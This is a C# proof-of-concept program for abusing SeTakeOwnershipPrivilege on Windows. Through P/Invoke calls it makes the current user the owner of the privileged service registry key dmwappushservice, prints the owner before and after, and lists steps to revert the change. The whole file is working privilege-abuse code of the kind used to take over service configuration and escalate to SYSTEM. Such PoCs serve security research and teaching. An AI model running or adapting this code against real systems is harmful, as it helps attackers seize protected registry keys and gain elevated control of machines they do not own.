using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Runtime.InteropServices;

namespace SeTakeOwnershipPrivilegePoC
{
    class SeTakeOwnershipPrivilegePoC
    {
        /*
         * P/Invoke : Enums
         */
        [Flags]
        enum FormatMessageFlags : uint
        {
            FORMAT_MESSAGE_ALLOCATE_BUFFER = 0x00000100,
            FORMAT_MESSAGE_IGNORE_INSERTS = 0x00000200,
            FORMAT_MESSAGE_FROM_STRING = 0x00000400,
            FORMAT_MESSAGE_FROM_HMODULE = 0x00000800,
            FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000,
            FORMAT_MESSAGE_ARGUMENT_ARRAY = 0x00002000
        }

        enum SE_OBJECT_TYPE
        {
            SE_UNKNOWN_OBJECT_TYPE,
            SE_FILE_OBJECT,
            SE_SERVICE,
            SE_PRINTER,
            SE_REGISTRY_KEY,
            SE_LMSHARE,
            SE_KERNEL_OBJECT,
            SE_WINDOW_OBJECT,
            SE_DS_OBJECT,
            SE_DS_OBJECT_ALL,
            SE_PROVIDER_DEFINED_OBJECT,
            SE_WMIGUID_OBJECT,
            SE_REGISTRY_WOW64_32KEY,
            SE_REGISTRY_WOW64_64KEY
        }

        [Flags]
        enum SECURITY_INFORMATION : uint
        {
            OWNER_SECURITY_INFORMATION = 0x00000001,
            GROUP_SECURITY_INFORMATION = 0x00000002,
            DACL_SECURITY_INFORMATION = 0x00000004,
            SACL_SECURITY_INFORMATION = 0x00000008,
            UNPROTECTED_SACL_SECURITY_INFORMATION = 0x10000000,
            UNPROTECTED_DACL_SECURITY_INFORMATION = 0x20000000,
            PROTECTED_SACL_SECURITY_INFORMATION = 0x40000000,
            PROTECTED_DACL_SECURITY_INFORMATION = 0x80000000
        }

        enum SID_NAME_USE
        {
            SidTypeUser = 1,
            SidTypeGroup,
            SidTypeDomain,
            SidTypeAlias,
            SidTypeWellKnownGroup,
            SidTypeDeletedAccount,
            SidTypeInvalid,
            SidTypeUnknown,
            SidTypeComputer,
            SidTypeLabel,
            SidTypeLogonSession
        }

        /*
         * P/Invoke : Win32 APIs
         */
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool ConvertSidToStringSid(
            IntPtr /* PSID */ Sid,
            out string StringSid);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern int FormatMessage(
            FormatMessageFlags dwFlags,
            IntPtr lpSource,
            int dwMessageId,
            int dwLanguageId,
            StringBuilder lpBuffer,
            int nSize,
            IntPtr Arguments);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern int GetNamedSecurityInfo(
            string pObjectName,
            SE_OBJECT_TYPE ObjectType,
            SECURITY_INFORMATION SecurityInfo,
            out IntPtr /* PSID* */ ppsidOwner,
            out IntPtr /* PSID* */ ppsidGroup,
            out IntPtr /* PACL* */ ppDacl,
            out IntPtr /* PACL* */ ppSacl,
            out IntPtr /* PSECURITY_DESCRIPTOR* */ ppSecurityDescriptor);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern int GetNamedSecurityInfo(
            string pObjectName,
            SE_OBJECT_TYPE ObjectType,
            SECURITY_INFORMATION SecurityInfo,
            out IntPtr /* PSID* */ ppsidOwner,
            IntPtr ppsidGroup,
            IntPtr ppDacl,
            IntPtr ppSacl,
            IntPtr ppSecurityDescriptor);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool LookupAccountName(
            string lpSystemName,
            string lpAccountName,
            IntPtr /* PSID */ Sid,
            ref int cbSid,
            StringBuilder ReferencedDomainName,
            ref int cchReferencedDomainName,
            out SID_NAME_USE peUse);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool LookupAccountSid(
            string lpSystemName,
            IntPtr /* PSID */ Sid,
            StringBuilder Name,
            ref int cchName,
            StringBuilder ReferencedDomainName,
            ref int cchReferencedDomainName,
            out SID_NAME_USE peUse);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern int SetNamedSecurityInfo(
            string pObjectName,
            SE_OBJECT_TYPE ObjectType,
            SECURITY_INFORMATION SecurityInfo,
            IntPtr /* PSID */ psidOwner,
            IntPtr /* PSID */ psidGroup,
            IntPtr /* PACL */ pDacl,
            IntPtr /* PACL */ pSacl);

        /*
         * Win32 Const
         */
        const int ERROR_SUCCESS = 0;
        const int ERROR_INSUFFICIENT_BUFFER = 0x0000007A;

        /*
         * User defined functions
         */
        static bool ConvertAccountNameToSid(
            ref string accountName,
            out IntPtr pSid,
            out SID_NAME_USE peUse)
        {
            int error;
            bool status;
            int cbSid = 8;
            int cchReferencedDomainName = 256;
            var domain = new StringBuilder(cchReferencedDomainName);

            do
            {
                pSid = Marshal.AllocHGlobal(cbSid);

                status = LookupAccountName(
                    null,
                    accountName,
                    pSid,
                    ref cbSid,
                    domain,
                    ref cchReferencedDomainName,
                    out peUse);
                error = Marshal.GetLastWin32Error();

                if (!status)
                {
                    domain.Clear();
                    domain = new StringBuilder(cchReferencedDomainName);
                    Marshal.FreeHGlobal(pSid);
                }
            } while (error == ERROR_INSUFFICIENT_BUFFER && !status);

            if (!status)
            {
                pSid = IntPtr.Zero;
                Console.WriteLine("[-] Failed to resolve account name to SID.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                return false;
            }

            ConvertSidToAccountName(pSid, out accountName, out peUse);

            return true;
        }


        static bool ConvertSidToAccountName(
            IntPtr pSid,
            out string accountName,
            out SID_NAME_USE peUse)
        {
            int error;
            int cchName = 256;
            int cchReferencedDomainName = 256;
            var name = new StringBuilder(cchName);
            var domain = new StringBuilder(cchReferencedDomainName);

            if (!LookupAccountSid(
                null,
                pSid,
                name,
                ref cchName,
                domain,
                ref cchReferencedDomainName,
                out peUse))
            {
                error = Marshal.GetLastWin32Error();
                accountName = null;
                Console.WriteLine("[-] Failed to resolve SID to account name.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                return false;
            }


            if (string.IsNullOrEmpty(name.ToString()) &&
                string.IsNullOrEmpty(domain.ToString()))
            {
                Console.WriteLine("[-] Failed to resolve SID to account name.");
                accountName = null;

                return false;
            }
            
            
            if (string.IsNullOrEmpty(name.ToString()))
            {
                accountName = domain.ToString();
            }
            else if (string.IsNullOrEmpty(domain.ToString()))
            {
                accountName = name.ToString();
            }
            else
            {
                accountName = string.Format(@"{0}\{1}", domain.ToString(), name.ToString());
            }

            return true;
        }


        static void DumpOwnerSidInformation(IntPtr pOwnerSid)
        {
            if (!ConvertSidToAccountName(
                    pOwnerSid,
                    out string accountName,
                    out SID_NAME_USE accountType))
            {
                return;
            }

            ConvertSidToStringSid(pOwnerSid, out string accountSidString);

            Console.WriteLine("[*] Current Owner Information:");
            Console.WriteLine("    |-> Name : {0}", accountName);
            Console.WriteLine("    |-> SID  : {0}", accountSidString);
            Console.WriteLine("    |-> Type : {0}", accountType);
        }


        static IntPtr GetOwnerInformation(string path, SE_OBJECT_TYPE objectType)
        {
            int error;

            error = GetNamedSecurityInfo(
                path,
                objectType,
                SECURITY_INFORMATION.OWNER_SECURITY_INFORMATION,
                out IntPtr pSidOwner,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero);

            if (error != ERROR_SUCCESS)
            {
                Console.WriteLine("[-] Failed to get owner information.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                return IntPtr.Zero;
            }
            
            return pSidOwner;
        }


        static string GetWin32ErrorMessage(int code, bool isNtStatus)
        {
            int nReturnedLength;
            ProcessModuleCollection modules;
            FormatMessageFlags dwFlags;
            int nSizeMesssage = 256;
            var message = new StringBuilder(nSizeMesssage);
            IntPtr pNtdll = IntPtr.Zero;

            if (isNtStatus)
            {
                modules = Process.GetCurrentProcess().Modules;

                foreach (ProcessModule mod in modules)
                {
                    if (string.Compare(
                        Path.GetFileName(mod.FileName),
                        "ntdll.dll",
                        StringComparison.OrdinalIgnoreCase) == 0)
                    {
                        pNtdll = mod.BaseAddress;
                        break;
                    }
                }

                dwFlags = FormatMessageFlags.FORMAT_MESSAGE_FROM_HMODULE |
                    FormatMessageFlags.FORMAT_MESSAGE_FROM_SYSTEM;
            }
            else
            {
                dwFlags = FormatMessageFlags.FORMAT_MESSAGE_FROM_SYSTEM;
            }

            nReturnedLength = FormatMessage(
                dwFlags,
                pNtdll,
                code,
                0,
                message,
                nSizeMesssage,
                IntPtr.Zero);

            if (nReturnedLength == 0)
            {
                return string.Format("[ERROR] Code 0x{0}", code.ToString("X8"));
            }
            else
            {
                return string.Format(
                    "[ERROR] Code 0x{0} : {1}",
                    code.ToString("X8"),
                    message.ToString().Trim());
            }
        }


        static bool SetOwnerInformation(
            string path,
            SE_OBJECT_TYPE objectType,
            IntPtr pSidOwner)
        {
            int error;

            error = SetNamedSecurityInfo(
                path,
                objectType,
                SECURITY_INFORMATION.OWNER_SECURITY_INFORMATION,
                pSidOwner,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero);

            if (error != ERROR_SUCCESS)
            {
                Console.WriteLine("[-] Failed to set owner information.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                return false;
            }
            else
            {
                return true;
            }
        }


        static void Main()
        {
            string accountName = Environment.UserName;
            string registryPath = @"MACHINE\SYSTEM\CurrentControlSet\Services\dmwappushservice";
            var objectType = SE_OBJECT_TYPE.SE_REGISTRY_KEY;
            IntPtr pInitialOwnerSid;
            IntPtr pChangedOwnerSid;

            Console.WriteLine("[*] If you have SeTakeOwnershipPrivilege, you can change owner of any files and registries to caller.");
            Console.WriteLine("[*] This PoC tries to change owner of a privileged registry key to caller of this PoC.");
            Console.WriteLine("    |-> Target : \"{0}\"", registryPath);
            Console.WriteLine("[>] Trying to get caller account name and SID.");

            if (!ConvertAccountNameToSid(
                ref accountName,
                out IntPtr pAccountSid,
                out SID_NAME_USE peUserUse))
            {
                return;
            }
            else
            {
                ConvertSidToStringSid(pAccountSid, out string accountSidString);
                Console.WriteLine("[+] Got current account name and SID.");
                Console.WriteLine("[*] Current Account Information:");
                Console.WriteLine("    |-> Name : {0}", accountName);
                Console.WriteLine("    |-> SID  : {0}", accountSidString);
                Console.WriteLine("    |-> Type : {0}", peUserUse);
            }


            Console.WriteLine("[>] Trying to get current owner information.");
            pInitialOwnerSid = GetOwnerInformation(registryPath, objectType);

            if (pInitialOwnerSid == IntPtr.Zero)
                return;

            DumpOwnerSidInformation(pInitialOwnerSid);

            Console.WriteLine("[>] Trying to change owner to \"{0}\".", accountName);

            if (!SetOwnerInformation(
                registryPath,
                objectType,
                pAccountSid))
            {
                return;
            }
            else
            {
                Console.WriteLine("[+] Owner is changed successfully.");
            }

            Console.WriteLine("[>] Trying to get current owner information.");
            pChangedOwnerSid = GetOwnerInformation(registryPath, objectType);

            if (pChangedOwnerSid == IntPtr.Zero)
                return;

            DumpOwnerSidInformation(pChangedOwnerSid);

            Console.WriteLine("[*] To revert owner, follow either of the following steps:");
            Console.WriteLine("    (1) Execute this PoC again as original owner with SeTakeOwnershipPrivilege.");
            Console.WriteLine("    (2) Edit from regedit.exe manualy:");
            Console.WriteLine("        (a) Open regedit.exe.");
            Console.WriteLine("        (b) Right click and open [Permissions] of the modified registry key.");
            Console.WriteLine("        (c) Open [Advanced] and change [Owner] to the original owner.\n");
        }
    }
}
